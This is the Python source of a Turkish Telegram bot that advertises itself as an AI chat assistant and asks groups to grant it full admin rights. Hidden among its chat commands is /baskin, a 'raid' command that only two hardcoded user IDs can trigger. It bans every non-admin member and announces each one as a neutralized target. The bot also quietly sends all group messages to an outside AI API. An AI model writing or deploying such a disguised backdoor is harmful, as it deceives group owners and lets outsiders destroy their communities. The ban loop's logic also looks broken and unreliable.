import os
import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackContext, filters

# Groq API ile AI yanıtı
async def groq_ai_cevapla(soru: str) -> str:
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {os.getenv('GROQ_API_KEY')}",
        "Content-Type": "application/json"
    }
    data = {
        "model": "llama3-8b-8192",
        "messages": [{"role": "user", "content": soru}]
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=15)
        response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"]
    except Exception as e:
        logging.error(f"Groq API hatası: {e}")
        return "Ya Sabır Ya Allah... Sistem cevap veremedi."

# Komut: /start
async def start(update: Update, context: CallbackContext):
    gif_url = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcDJtdzFkMnpqY2hlcDljM3VzaDJ0em1vaHl2MmU1aWYxNGtrd2VxaCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/WUlplcGkF85Uk/giphy.gif"
    await context.bot.send_animation(chat_id=update.effective_chat.id, animation=gif_url)
    
    keyboard = [
        [InlineKeyboardButton("Destek", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("Geliştirici", url="https://t.me/ZeydBinhalit")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Ben Türkiye Cumhuriyeti API destekli bir yapay zekâ botuyum.\n"
        "`/nedersin` komutu ile grup mesajlarına yanıt verebilirim.",
        reply_markup=reply_markup
    )

# Komut: /help
async def help_command(update: Update, context: CallbackContext):
    gif_url = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcnRpZmtzdTZmcjJvdjFhM2dwc3lreHlmcWR4d3Fva3R5bnRpbHZmdSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/sIIhZliB2McAo/giphy.gif"
    await context.bot.send_animation(chat_id=update.effective_chat.id, animation=gif_url)

    keyboard = [
        [InlineKeyboardButton("Destek", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("Geliştirici", url="https://t.me/ZeydBinhalit")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Eğer grubumuzda çalışmıyorsam sebebi yetkilerim eksik olabilir.\n"
        "Lütfen bana tam yetki verin.",
        reply_markup=reply_markup
    )

# Komut: /nedersin (yanıtlanan mesaja yanıt verir)
async def nedersin(update: Update, context: CallbackContext):
    if update.message.reply_to_message:
        mesaj = update.message.reply_to_message.text
        cevap = await groq_ai_cevapla(mesaj)
        await update.message.reply_text(cevap)
    else:
        await update.message.reply_text("Bu komutu bir mesaja yanıt vererek kullan.")

# Komut: /sor {metin}
async def sor(update: Update, context: CallbackContext):
    if len(context.args) == 0:
        return await update.message.reply_text("Lütfen bir soru yaz.")
    soru = ' '.join(context.args)
    cevap = await groq_ai_cevapla(soru)
    await update.message.reply_text(f"Soru: {soru}\nCevap: {cevap}")

# Komut: /gel — normal sohbete katılır
async def gel(update: Update, context: CallbackContext):
    await update.message.reply_text("Merhaba! Sohbete dahil oldum. Bir şey yazarsan cevap verebilirim.")

# Komut: /baskin — tüm üyeleri banlar (sadece 2 yetkili kullanabilir)
YETKILI_KULLANICILAR = [8069059457, 7510507299]

async def baskin(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in YETKILI_KULLANICILAR:
        return
    chat_id = update.effective_chat.id
    me = await context.bot.get_me()
    admins = await context.bot.get_chat_administrators(chat_id)
    admin_ids = [admin.user.id for admin in admins]

    members = await context.bot.get_chat_members_count(chat_id)
    await update.message.reply_text("BAŞLIYORUZ! 😈")

    for user_id in range(1, members):
        try:
            member = await context.bot.get_chat_member(chat_id, user_id)
            if member.user.id not in admin_ids and not member.user.is_bot:
                await context.bot.ban_chat_member(chat_id, member.user.id)
                await context.bot.send_message(chat_id, f"{member.user.full_name} kod adıyla hedef etkisiz hale getirildi.")
        except Exception:
            continue

# Normal mesajlara yanıt verir
async def sohbet(update: Update, context: CallbackContext):
    if update.message.text and update.message.chat.type != "private":
        cevap = await groq_ai_cevapla(update.message.text)
        await update.message.reply_text(cevap)

# Başlatıcı
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    TOKEN = os.getenv("TELEGRAM_TOKEN")
    if not TOKEN or not os.getenv("GROQ_API_KEY"):
        raise ValueError("Gerekli API anahtarları eksik!")
    
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("nedersin", nedersin))
    app.add_handler(CommandHandler("sor", sor))
    app.add_handler(CommandHandler("gel", gel))
    app.add_handler(CommandHandler("baskin", baskin))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), sohbet))

    print("🤖 Sabr AI başladı.")
    app.run_polling()
